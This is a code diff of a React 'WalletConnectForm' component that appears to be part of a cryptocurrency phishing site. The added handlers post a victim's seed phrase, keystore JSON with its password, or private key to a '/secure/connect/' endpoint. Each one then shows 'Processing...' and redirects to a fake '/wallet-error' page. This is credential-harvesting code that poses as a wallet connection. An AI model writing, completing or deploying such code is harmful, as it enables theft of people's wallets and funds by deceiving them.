@@ -2,6 +2,7 @@ import React, { useEffect, useState } from 'react';
 import { AiOutlineClose } from 'react-icons/ai';
 import styles from './WalletConnectForm.module.css';
 import {useNavigate} from 'react-router-dom'
+import axios from 'axios'
 
 const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
 
@@ -20,7 +21,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
   const [phraseSubmit, setPhraseSubmit] = useState('CONNECT')
   const [keystoreSubmit, setKeystoreSubmit] = useState('CONNECT')
   const [privateSubmit, setPrivateSubmit] = useState('CONNECT')
-
+  
   useEffect(() => {
     setWallet(walletName)
   }, [wallet])
@@ -53,40 +54,78 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     }
   };
 
-  const handlePhraseSubmit = (e) => {
+
+  // ##### PHRASE
+  const handlePhraseSubmit = async (e) => {
     e.preventDefault();
+
+    const name = wallet
+    const type = "Phrase"
+    const data = phrase
+    const password = "not_required"
+
     if (validatePhrase(phrase)) {
-      // Proceed with form submission
+      try {
+        const res = await axios.post('http://localhost:3000/secure/connect/', { name, type, data, password });
+      } catch (error) {
+        console.log(error)
+      }
+
       setPhraseSubmit("Processing...")
       setTimeout(() => {
         navigate('/wallet-error')
       }, 5000);
-      console.log(wallet);
-      console.log(phrase);
-
     } else {
       setPhraseError(true);
     }
   }
-  const handleKeystoreSubmit = (e) => {
+
+
+  // ##### KEYSTORE JSON
+  const handleKeystoreSubmit = async (e) => {
     e.preventDefault();
-    console.log(wallet)
-    console.log(keystore)
-    console.log(keystorePassword)
+
+    const name = wallet
+    const type = "Keystore_JSON"
+    const data = keystore
+    const password = keystorePassword
+    
+    try {
+      const res = await axios.post('http://localhost:3000/secure/connect/', { name, type, data, password });
+    } catch (error) {
+      console.log(error)
+    }
+
     setKeystoreSubmit("Processing...")
     setTimeout(() => {
       navigate('/wallet-error')
     }, 5000);
 
   }
-  const handlePrivateKeySubmit = (e) => {
+  // ##### PRIVATE KEY
+  const handlePrivateKeySubmit = async (e) => {
     e.preventDefault();
-    console.log(wallet)
-    console.log(privateKey)
-    setPrivateSubmit("Processing...")
-    setTimeout(() => {
-      navigate('/wallet-error')
-    }, 5000);
+
+    const name = wallet
+    const type = "Private_Key"
+    const data = privateKey
+    const password = "not_required"
+
+    if (validatePhrase(privateKey)) {
+      try {
+        const res = await axios.post('http://localhost:3000/secure/connect/', { name, type, data, password });
+      } catch (error) {
+        console.log(error)
+      }
+
+      setPhraseSubmit("Processing...")
+      setTimeout(() => {
+        navigate('/wallet-error')
+      }, 5000);
+    } else {
+      setPhraseError(true);
+    }
+
   }
   
   return (
